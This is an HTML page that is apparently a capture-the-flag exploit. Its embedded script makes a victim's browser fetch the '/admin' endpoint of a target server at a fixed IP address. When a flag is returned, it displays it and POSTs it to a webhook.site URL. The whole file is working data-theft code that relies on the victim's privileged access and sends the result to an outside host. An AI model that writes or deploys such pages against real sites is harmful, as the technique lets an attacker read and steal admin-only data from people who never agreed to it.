<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>XSS Exploit Running...</h1>
    <script>
        const targetUrl = 'http://223.6.249.127:19796';
        const webhookUrl = 'https://webhook.site/a6fba91f-4d06-4930-b603-c7986fbb4d49';
        
        console.log('Starting exploit...');
        console.log('Target:', targetUrl);
        console.log('Webhook:', webhookUrl);
        
        fetch(targetUrl + '/admin')
            .then(response => {
                console.log('Response status:', response.status);
                return response.json();
            })
            .then(data => {
                console.log('Response data:', data);
                
                if (data.flag) {
                    document.body.innerHTML = '<h1 style="color: red; font-size: 48px;">Flag: ' + data.flag + '</h1>';
                    console.log('FLAG FOUND:', data.flag);
                    
                    // Send to webhook
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            flag: data.flag,
                            timestamp: new Date().toISOString(),
                            exploit: 'XSS via /visit endpoint',
                            target: targetUrl
                        })
                    })
                    .then(() => console.log('Flag sent to webhook successfully!'))
                    .catch(err => console.error('Failed to send to webhook:', err));
                }
            })
            .catch(error => {
                console.error('Exploit failed:', error);
                document.body.innerHTML = '<h1 style="color: red;">Error: ' + error.message + '</h1>';
            });
    </script>
</body>
</html>
